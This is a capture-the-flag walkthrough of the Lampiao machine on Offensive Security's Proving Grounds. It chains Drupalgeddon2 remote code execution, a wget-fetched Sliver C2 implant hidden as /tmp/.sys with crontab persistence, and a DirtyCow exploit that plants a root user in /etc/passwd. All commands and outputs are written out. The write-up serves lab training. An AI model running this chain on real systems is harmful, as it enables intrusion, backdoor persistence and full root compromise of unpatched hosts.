# Lampiao - Proving Grounds Play

## Machine Info

- **Platform:** Offensive Security Proving Grounds (Play)
- **Difficulty:** Intermediate
- **IP Address:** 192.168.232.48
- **OS:** Ubuntu 14.04, Linux kernel 4.4.0-31-generic (i686 / 32-bit)

## Objectives Completed

- Perform an nmap scan to identify open ports and services
- Use gobuster to enumerate the web application and identify Drupal 7 CMS
- Exploit the Drupalgeddon2 vulnerability (CVE-2018-7600) to gain RCE as `www-data`
- Deliver a Sliver C2 implant via crontab for persistent access
- Identify the vulnerable 32-bit kernel and compile DirtyCow (CVE-2016-5195)
- Escalate to root via DirtyCow + SSH as newly created `toor` user

## Summary

Lampiao runs Drupal 7 on port 1898 (port 80 is a non-HTTP service returning ASCII art). Drupalgeddon2 (CVE-2018-7600) gives unauthenticated RCE as `www-data`. A Sliver C2 implant is delivered via a crontab entry, providing a persistent MTLS callback through a socat redirector. The kernel (`4.4.0-31-generic`, i686) is vulnerable to DirtyCow (CVE-2016-5195). The firefart variant of DirtyCow is compiled on-target and executed via Sliver; a tight SSH retry loop catches the new `toor` root user immediately after `/etc/passwd` is written, before the kernel panics.

---

## Infrastructure Setup

### Sliver C2 + Socat Redirector

```
[Target] → 192.168.45.187:443 (Kali tun0 / socat) → 192.168.36.102:4443 (Sliver C2)
```

```bash
# On Kali — socat redirector (forwards VPN IP:443 to Sliver C2 server)
sudo socat TCP-LISTEN:443,fork,bind=192.168.45.187,reuseaddr TCP:192.168.36.102:4443 &

# On Kali — start MTLS listener on Sliver C2
echo -e "mtls --lport 4443\nexit" > /tmp/mtls.rc
sliver-client console --rc /tmp/mtls.rc

# Generate 32-bit implant (target is i686)
# [on Sliver C2 server]
generate --mtls 192.168.45.187:443 --os linux --arch 386 --save /home/kali/lampiao32.bin
```

---

## Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -p- --min-rate=1000 192.168.232.48
```

**Results:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Lampiao
```

**Key Findings:**
- Port 80 returns SSH banner / ASCII art — **not HTTP**, do not use with gobuster or curl
- Port 1898 — Apache 2.4.7 running **Drupal 7**
- Port 22 — OpenSSH 6.6.1p1 (Ubuntu 14.04)
- OS: Ubuntu 14.04, kernel **4.4.0-31-generic i686 (32-bit)**

---

## Enumeration

### Web Enumeration on Port 1898

```bash
gobuster dir -u http://192.168.232.48:1898 -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

**Key Findings:**
- `/user` — Drupal login page
- `/CHANGELOG.txt` — confirms **Drupal 7.54**
- `/robots.txt`, `/admin`, `/misc`, `/modules`, `/themes` — standard Drupal structure

### Drupal Version Confirmation

```bash
curl -s http://192.168.232.48:1898/CHANGELOG.txt | head -5
```

**Output:**
```
Drupal 7.54, 2017-02-01
```

Drupal 7.54 is vulnerable to **Drupalgeddon2 (CVE-2018-7600)**.

---

## Exploitation

### Drupalgeddon2 (CVE-2018-7600)

Using the `drupalgeddon2.py` exploit (pimps variant):

```bash
# Test RCE
python3 drupalgeddon2.py -c "id" http://192.168.232.48:1898
```

**Output:**
```
[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-...
[*] Triggering exploit to execute: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE achieved as www-data!**

### Implant Delivery via Drupalgeddon2

Download the 32-bit Sliver implant and set a crontab for persistence:

```bash
python3 drupalgeddon2.py -c \
  "wget -q http://192.168.45.187:8080/lampiao32.bin -O /tmp/.sys && \
   chmod +x /tmp/.sys && \
   echo '* * * * * /tmp/.sys > /tmp/sys.log 2>&1' | crontab -" \
  http://192.168.232.48:1898
```

Wait up to 60 seconds for the crontab to fire. Confirm the session in Sliver:

```bash
echo -e "sessions\nexit" > /tmp/s.rc
sliver-client console --rc /tmp/s.rc
```

**Output:**
```
 ID         Name              Transport   Remote Address          Hostname   Username   Process (PID)      OS        
 98838cf1   CROWDED_RESPOND   mtls        192.168.36.100:37998    lampiao    www-data   /tmp/.sys (1991)   linux/386  [ALIVE]
```

### Local Flag

```bash
# Via Sliver session
echo -e "use 98838cf1\nexecute -t 10 -o cat /home/tiago/local.txt\nexit" > /tmp/s.rc
sliver-client console --rc /tmp/s.rc
```

**local.txt:** `3351527f57f84822df43aced17825518`

---

## Privilege Escalation

### Kernel Version Check

```bash
echo -e "use 98838cf1\nexecute -t 10 -o uname -a\nexit" > /tmp/s.rc
sliver-client console --rc /tmp/s.rc
```

**Output:**
```
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 i686 i686 i686 GNU/Linux
```

Kernel `4.4.0-31` on i686 is vulnerable to **DirtyCow (CVE-2016-5195)**.

### Compile DirtyCow on Target

Download and compile the firefart variant of DirtyCow (creates a new root user `toor`):

```bash
python3 drupalgeddon2.py -c \
  "wget -q http://192.168.45.187:8080/dirty.c -O /tmp/dirty.c && \
   gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt && \
   echo compiled" \
  http://192.168.232.48:1898
```

**Output:**
```
compiled
```

> **Note:** Target is 32-bit (i686) — use `gcc` without `-m32` flag since the system gcc targets i686 natively.

### Execute DirtyCow + SSH Race

Upload a wrapper script and fire it via Sliver, simultaneously hammering SSH as the new `toor` user. The exploit writes `toor:pass123` to `/etc/passwd` before the kernel panic window:

```bash
# Create wrapper script
cat > rundirty.sh << 'EOF'
#!/bin/bash
/tmp/dirty pass123 > /tmp/dirty.log 2>&1
EOF

# Upload to target via Sliver
echo -e "use 98838cf1\nupload --overwrite /home/kali/rundirty.sh /tmp/rundirty.sh\nexit" > /tmp/s.rc
sliver-client console --rc /tmp/s.rc

# chmod
echo -e "use 98838cf1\nexecute -t 5 chmod +x /tmp/rundirty.sh\nexit" > /tmp/s.rc
sliver-client console --rc /tmp/s.rc

# Fire dirty in background, hammer SSH simultaneously
echo -e "use 98838cf1\nexecute /tmp/rundirty.sh\nexit" > /tmp/s.rc
timeout 25 sliver-client console --rc /tmp/s.rc &

sleep 2
for i in $(seq 1 40); do
  result=$(sshpass -p "pass123" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
    toor@192.168.232.48 "id && cat /root/proof.txt" 2>/dev/null)
  [ -n "$result" ] && echo "GOT ROOT: $result" && break
  sleep 1
done
```

**Output:**
```
GOT ROOT: uid=0(toor) gid=0(root) groups=0(root)
36e60c187949cc6aca572e7833fc1a53
```

**ROOT ACCESS ACHIEVED!**

### Root Flag

**proof.txt:** `36e60c187949cc6aca572e7833fc1a53`

---

## Flags

| Flag Type | Value |
|-----------|-------|
| local.txt | `3351527f57f84822df43aced17825518` |
| proof.txt | `36e60c187949cc6aca572e7833fc1a53` |

---

## Key Takeaways

1. **Non-standard ports:** Always scan all ports — Drupal was on 1898, not 80
2. **Drupalgeddon2:** Drupal 7 < 7.58 is trivially exploitable via unauthenticated RCE
3. **32-bit awareness:** Always check architecture before compiling exploits; 64-bit implants/binaries will not run on i686
4. **DirtyCow timing:** The firefart `/etc/passwd` variant writes the new user before the kernel panic; a tight SSH retry loop can catch the window
5. **Crontab persistence:** Delivering implants via crontab entries is reliable when Apache kills backgrounded processes

---

## Tools Used

- nmap
- gobuster
- drupalgeddon2.py (CVE-2018-7600)
- Sliver C2 (MTLS, linux/386 implant)
- socat (C2 redirector)
- DirtyCow / dirty.c firefart variant (CVE-2016-5195)
- sshpass

---

## Attack Path Summary

```
nmap → Drupal 7.54 on port 1898
    ↓
gobuster → confirm Drupal structure
    ↓
Drupalgeddon2 (CVE-2018-7600) → RCE as www-data
    ↓
wget 32-bit Sliver implant + crontab → MTLS C2 session
    ↓
local.txt captured (/home/tiago/local.txt)
    ↓
uname -a → kernel 4.4.0-31-generic i686 → DirtyCow vulnerable
    ↓
gcc dirty.c → /tmp/dirty (firefart variant, creates toor:pass123)
    ↓
Execute via Sliver + SSH retry loop → toor (uid=0)
    ↓
ROOT! proof.txt captured (/root/proof.txt)
```

---

## References

- [CVE-2018-7600 - Drupalgeddon2](https://www.exploit-db.com/exploits/44449)
- [CVE-2016-5195 - DirtyCow](https://dirtycow.ninja/)
- [DirtyCow firefart variant](https://github.com/FireFart/dirtycow)
- [Sliver C2](https://github.com/BishopFox/sliver)
